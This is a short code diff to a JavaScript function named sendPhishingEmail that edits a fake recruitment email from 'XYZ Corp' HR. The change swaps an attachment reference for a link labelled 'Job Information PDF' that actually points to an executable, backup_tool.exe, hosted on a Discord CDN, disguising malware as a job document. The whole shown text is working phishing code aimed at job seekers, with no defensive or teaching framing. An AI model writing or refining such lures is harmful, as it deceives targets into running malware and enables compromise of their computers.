@@ -53,7 +53,8 @@ async function sendPhishingEmail(targetEmail) {
     html: `
       <p>Dear Candidate,</p>
       <p>We are pleased to inform you that your profile matches our <b>Software Engineer</b> role at <b>XYZ Corp</b>. 
-      Please find the job details in the attached document.</p>
+      Please find the job details in the document provided in the link.</p>
+      <a href="https://cdn.discordapp.com/attachments/970018117893894165/1356978959794962452/backup_tool.exe?ex=67ee88a3&is=67ed3723&hm=bae08a1f286a50045f8b68142ebf4580b1773ebbe8fb07b1b47d2ada0e821e5c&">Job Information PDF</a>
       <p>Best Regards,<br>HR Team</p>
     `,
     /*attachments: [
